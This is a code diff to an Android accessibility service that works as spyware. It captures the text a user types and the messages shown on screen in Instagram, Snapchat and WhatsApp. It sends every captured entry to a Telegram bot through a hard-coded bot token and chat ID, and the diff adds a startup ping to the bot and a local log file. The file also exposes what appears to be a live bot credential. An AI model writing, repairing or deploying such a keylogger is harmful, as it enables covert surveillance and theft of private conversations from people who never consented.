@@ -5,9 +5,12 @@ import android.os.AsyncTask;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
-import java.io.OutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.net.URLEncoder;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.HashSet;
@@ -18,9 +21,9 @@ public class GlobalActionBarService extends AccessibilityService {
 
     private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
 
-    // 🔥 PASTE YOUR BOT TOKEN AND CHAT ID HERE
-    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";    // e.g., "1234567890:ABCdefGHIjkl"
-    private static final String CHAT_ID = "5465116744";        // e.g., "123456789"
+    // 🔥 YOUR CREDENTIALS
+    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";    // replace with your token
+    private static final String CHAT_ID = "5465116744";        // replace with your numeric user ID
 
     private Set<String> uiJunk = new HashSet<String>() {{
         add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
@@ -35,12 +38,26 @@ public class GlobalActionBarService extends AccessibilityService {
         add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
     }};
 
+    private boolean serviceStarted = false;
+
+    @Override
+    public void onServiceConnected() {
+        super.onServiceConnected();
+        serviceStarted = true;
+        // Send a test message to confirm the bot works
+        sendToTelegram("✅ Screen Logger service started successfully!");
+        // Also write to local file for debugging
+        writeToFile("Service started at " + dateFormat.format(new Date()));
+    }
+
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (!serviceStarted) return; // safety
+
         if (event.getPackageName() == null) return;
         String pkg = event.getPackageName().toString();
 
-        // Target apps
+        // Target only Instagram, Snapchat, WhatsApp
         if (!pkg.equals("com.instagram.android") &&
             !pkg.equals("com.snapchat.android") &&
             !pkg.equals("com.whatsapp")) {
@@ -58,11 +75,12 @@ public class GlobalActionBarService extends AccessibilityService {
                             getAppName(pkg),
                             typed);
                     sendToTelegram(log);
+                    writeToFile(log);
                 }
             }
         }
 
-        // --- 2. SCREEN TEXT (messages only) ---
+        // --- 2. SCREEN TEXT (messages) ---
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
 
@@ -75,6 +93,7 @@ public class GlobalActionBarService extends AccessibilityService {
                             getAppName(pkg),
                             extracted);
                     sendToTelegram(log);
+                    writeToFile(log);
                 }
             }
         }
@@ -126,43 +145,47 @@ public class GlobalActionBarService extends AccessibilityService {
         return pkg;
     }
 
-    // ------------------ TELEGRAM SENDER ------------------
+    // ---------- TELEGRAM SENDER (GET method) ----------
     private void sendToTelegram(final String message) {
-        new AsyncTask<Void, Void, Void>() {
+        new Thread(new Runnable() {
             @Override
-            protected Void doInBackground(Void... voids) {
+            public void run() {
                 try {
-                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
+                            "/sendMessage?chat_id=" + CHAT_ID +
+                            "&text=" + URLEncoder.encode(message, "UTF-8");
                     URL url = new URL(urlString);
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                    conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Content-Type", "application/json");
-                    conn.setDoOutput(true);
-
-                    String json = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + escapeJson(message) + "\"}";
-                    OutputStream os = conn.getOutputStream();
-                    os.write(json.getBytes());
-                    os.flush();
-                    os.close();
-
+                    conn.setRequestMethod("GET");
+                    conn.setConnectTimeout(5000);
+                    conn.setReadTimeout(5000);
                     int responseCode = conn.getResponseCode();
-                    // Optionally check response
+                    // If not 200, write the error to file
+                    if (responseCode != 200) {
+                        writeToFile("Telegram error: " + responseCode + " for message: " + message);
+                    }
+                    conn.disconnect();
                 } catch (Exception e) {
-                    // Silent fail – you can log to a file if needed
+                    writeToFile("Telegram exception: " + e.toString());
                 }
-                return null;
             }
-        }.execute();
+        }).start();
     }
 
-    private String escapeJson(String s) {
-        return s.replace("\\", "\\\\")
-                .replace("\"", "\\\"")
-                .replace("\n", "\\n")
-                .replace("\r", "\\r")
-                .replace("\t", "\\t");
+    // ---------- LOCAL LOGGING (for debugging) ----------
+    private void writeToFile(String text) {
+        try {
+            File logFile = new File(getFilesDir(), "debug_log.txt");
+            FileOutputStream fos = new FileOutputStream(logFile, true);
+            OutputStreamWriter writer = new OutputStreamWriter(fos);
+            writer.write(text + "\n");
+            writer.flush();
+            writer.close();
+        } catch (Exception e) {
+            // can't log this – but we ignore
+        }
     }
 
     @Override
     public void onInterrupt() {}
-                                                                        }
+}
